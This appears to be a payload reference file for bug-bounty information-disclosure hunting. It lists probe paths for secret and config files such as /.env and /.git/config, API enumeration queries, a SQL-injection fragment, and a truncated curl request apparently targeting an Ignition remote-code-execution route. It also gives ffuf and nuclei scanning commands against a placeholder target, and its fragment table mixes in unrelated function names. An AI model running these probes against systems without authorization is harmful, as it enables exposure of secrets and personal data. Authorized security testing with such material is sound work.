# Payloads — Information Disclosure

Payload lists and probe banks. Methodology and usage are in the parent SKILL.md.

## Payload references from upstream skills (deduplicated)

### hunting / references/payloads.md

# Info Disclosure — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- `/.git/config` `/.env` `/.DS_Store` `/server-status` `/actuator/env`

- `/api/v1/users?limit=1000` `/api/v1/users/0`

- `?fields=all` `?expand=*` `?include=deleted`

- S3 -> `https://bucket.s3.amazonaws.com/?list-type=2`



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 6× | `acf_get_posts()` |

| 6× | `is_trusted_daemon()` |

| 5× | `try_to_connect_and_handshake_with_new_peer()` |

| 4× | `rescan_spent()` |

| 3× | `connections_maker()` |

| 3× | `curl_easy_reset()` |

| 3× | `\x00` |

| 3× | `data->state.referer` |

| 3× | `wallet2::rescan_spent()` |

| 2× | `jdh34k' and 1=0 union all select 1,2,3;--` |

| 2× | `doSearch()` |

| 2× | `{id}` |

| 2× | `<feature.flag>` |

| 2× | `<REDACTED>` |

| 2× | `{F_number_file}` |

| 2× | `fetch()` |

| 2× | `https://fetlife.com/events/{event-id}` |

| 2× | `curl -XPOST -H 'Content-Type: application/json' -d ‘{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameter` |

| 2× | `/wp-json/wp/v2/sensei-messages/<numericID>` |

| 2× | `get_outgoing_connections_count()` |



## Parameters observed



`text_query` · `page` · `url` · `token` · `subject` · `sort_type` · `client_id` · `sentry_key` · `action` · `query` · `defid` · `id` · `username` · `email` · `sort` · `file.path` · `SRBHeaderID` · `isBoard` · `OT` · `redirect_uri`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_info-disclosure.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_info-disclosure.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_info-disclosure.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_info-disclosure.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Run exposures/misconfiguration templates against every host; triage for real secrets and PII.



```sh

nuclei -u https://target -tags exposure,disclosure,debug,config,files,keys,tokens \

       -severity info,low,medium,high,critical -rl 40 -o nuclei_info-disclosure.txt

nuclei -u https://target -t ~/nuclei-templates/http/exposures \

       -rl 40 -o nuclei_info-disclosure_exposures.txt

nuclei -u https://target -t ~/nuclei-templates/http/misconfiguration \

       -rl 40 -o nuclei_info-disclosure_misconfiguration.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
